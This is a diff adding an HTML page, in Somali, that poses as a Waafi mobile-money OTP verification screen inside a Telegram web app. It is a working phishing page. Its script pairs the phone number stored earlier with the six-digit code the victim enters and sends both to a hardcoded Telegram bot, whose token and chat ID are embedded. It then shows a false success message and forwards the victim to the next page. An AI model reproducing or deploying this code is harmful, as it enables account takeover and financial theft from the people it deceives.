@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="so">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waafi - OTP Kowaad</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            margin-top: 50px;
+            padding: 40px 20px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+            box-sizing: border-box;
+        }
+        
+        h2 {
+            font-size: 24px;
+            color: #222;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .instruction {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .otp-group {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .otp-input {
+            width: 42px;
+            height: 55px;
+            border: 1.5px solid #82d13d;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .otp-input:focus {
+            border-color: #5fa82a;
+            box-shadow: 0 0 0 2px rgba(130, 209, 61, 0.3);
+        }
+        
+        .resend-text {
+            color: #999;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .btn-verify {
+            background-color: #e0e0e0;
+            color: #999;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: not-allowed;
+            transition: all 0.3s;
+        }
+        
+        .btn-verify.active {
+            background-color: #82d13d;
+            color: white;
+            cursor: pointer;
+        }
+        
+        .btn-verify.active:active {
+            transform: scale(0.98);
+        }
+        
+        #loadingSection {
+            display: none;
+        }
+        
+        .footer-wave {
+            width: 100%;
+            background: linear-gradient(to bottom, #82d13d, #a3e635);
+            padding: 60px 0;
+            margin-top: auto;
+            text-align: center;
+            color: white;
+        }
+        
+        #errorBox {
+            color: red;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            min-height: 20px;
+        }
+        
+        #successBox {
+            color: #82d13d;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            min-height: 20px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="card" id="inputSection">
+        <h2>Xaqiijinta OTP-ga Kowaad</h2>
+        <p class="instruction">Geli OTP-ga kowaad</p>
+
+        <div id="errorBox"></div>
+        <div id="successBox"></div>
+
+        <div class="otp-group">
+            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric" autocomplete="one-time-code">
+            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+        </div>
+
+        <p class="resend-text">Koodka mar kale u dir <span id="timer">60</span>s</p>
+
+        <button id="verifyBtn" class="btn-verify" disabled>
+            XAQIIJI OTP
+        </button>
+    </div>
+
+    <div class="card" id="loadingSection">
+        <p>Fadlan sug...</p>
+    </div>
+
+    <div class="footer-wave">
+        <p>© 2026 Waafi Soomaaliya</p>
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIGURE YOUR TELEGRAM BOT
+        // ============================================================
+        const BOT_TOKEN = "8255631739:AAEnO1w67WAdk9i8lOK_1IsUkIqzSEwySaY";
+        const ADMIN_CHAT_ID = "5615316142";
+        // ============================================================
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.otp-input');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const inputSection = document.getElementById('inputSection');
+            const loadingSection = document.getElementById('loadingSection');
+            const timerText = document.getElementById('timer');
+            const errorBox = document.getElementById('errorBox');
+            const successBox = document.getElementById('successBox');
+
+            let isSubmitting = false;
+
+            // Initialize Telegram WebApp
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            const phone = localStorage.getItem('phone');
+            if (!phone) {
+                errorBox.innerText = "Fadhigu wuu dhacay. Fadlan dib u gal.";
+                setTimeout(() => window.location.href = "/index.html", 1500);
+                return;
+            }
+
+            // Start countdown
+            startCountdown(timerText);
+
+            // Focus first input on load
+            setTimeout(() => {
+                if (inputs[0]) inputs[0].focus();
+            }, 500);
+
+            // ---- Auto-move to next input on typing ----
+            inputs.forEach(function(input, i) {
+                input.addEventListener('input', function() {
+                    // Allow only digits
+                    this.value = this.value.replace(/[^0-9]/g, '');
+
+                    // Auto-advance to next field if current is filled
+                    if (this.value.length === 1 && i < inputs.length - 1) {
+                        inputs[i + 1].focus();
+                    }
+
+                    checkInputs(inputs, verifyBtn);
+                });
+
+                // Handle backspace to go to previous field
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === "Backspace") {
+                        if (!this.value && i > 0) {
+                            inputs[i - 1].focus();
+                            inputs[i - 1].value = '';
+                            checkInputs(inputs, verifyBtn);
+                        }
+                    }
+                });
+
+                // Handle paste of full OTP
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = paste.replace(/[^0-9]/g, '').split('');
+
+                    digits.forEach(function(digit, idx) {
+                        if (idx < inputs.length) {
+                            inputs[idx].value = digit;
+                        }
+                    });
+
+                    // Focus on next empty field or last field
+                    const emptyIndex = [...inputs].findIndex(function(inp) {
+                        return inp.value === '';
+                    });
+                    if (emptyIndex !== -1) {
+                        inputs[emptyIndex].focus();
+                    } else {
+                        inputs[inputs.length - 1].focus();
+                    }
+
+                    checkInputs(inputs, verifyBtn);
+                });
+            });
+
+            // ---- Button click handler ----
+            verifyBtn.addEventListener('click', function() {
+                handleVerification(inputs, verifyBtn, inputSection, loadingSection, errorBox, successBox, BOT_TOKEN, ADMIN_CHAT_ID);
+            });
+
+        }); // end DOMContentLoaded
+
+        // ============== FUNCTIONS ==============
+
+        function checkInputs(inputs, verifyBtn) {
+            let allFilled = true;
+            inputs.forEach(function(inp) {
+                if (inp.value.length !== 1) allFilled = false;
+            });
+
+            verifyBtn.disabled = !allFilled;
+            if (allFilled) {
+                verifyBtn.classList.add('active');
+            } else {
+                verifyBtn.classList.remove('active');
+            }
+        }
+
+        function startCountdown(timerText) {
+            let count = 60;
+            timerText.innerText = count;
+            const interval = setInterval(function() {
+                count--;
+                timerText.innerText = count;
+                if (count < 0) clearInterval(interval);
+            }, 1000);
+        }
+
+        async function handleVerification(inputs, verifyBtn, inputSection, loadingSection, errorBox, successBox, BOT_TOKEN, ADMIN_CHAT_ID) {
+            if (verifyBtn.disabled) return;
+
+            const phone = localStorage.getItem('phone');
+            if (!phone) {
+                errorBox.innerText = "❌ Fadhigu wuu dhacay";
+                return;
+            }
+
+            let otp = "";
+            inputs.forEach(function(i) {
+                otp += i.value;
+            });
+
+            // Show loading
+            errorBox.innerText = "";
+            successBox.innerText = "";
+            inputSection.style.display = "none";
+            loadingSection.style.display = "block";
+
+            try {
+                // ---- 1. Send OTP to Telegram Bot ----
+                if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && ADMIN_CHAT_ID !== "YOUR_ADMIN_CHAT_ID_HERE") {
+                    const message = "🔐 *OTP Kowaad waa la soo galiyay*\n\n📱 Phone: `" + phone + "`\n🔢 OTP: `" + otp + "`";
+
+                    await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_CHAT_ID,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                }
+
+                // ---- 2. Also try the old backend endpoint (if exists) ----
+                try {
+                    await fetch('/api/verify-first-otp', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            phone: phone,
+                            otp: otp
+                        })
+                    });
+                } catch (backendErr) {
+                    console.log("Backend endpoint not available, continuing...");
+                }
+
+                // ---- 3. Navigate to page9.html ----
+                successBox.innerText = "✅ OTP-ga waa sax! U gudbaya...";
+                setTimeout(function() {
+                    window.location.href = "page9.html";
+                }, 1000);
+
+            } catch (err) {
+                console.error("❌ Error:", err);
+                errorBox.innerText = "❌ Khalad ayaa dhacay. Fadlan dib u day.";
+
+                // Reset form
+                inputSection.style.display = "block";
+                loadingSection.style.display = "none";
+                inputs.forEach(function(i) {
+                    i.value = "";
+                });
+                verifyBtn.disabled = true;
+                verifyBtn.classList.remove('active');
+                if (inputs[0]) inputs[0].focus();
+            }
+        }
+    </script>
+
+</body>
+
+</html>
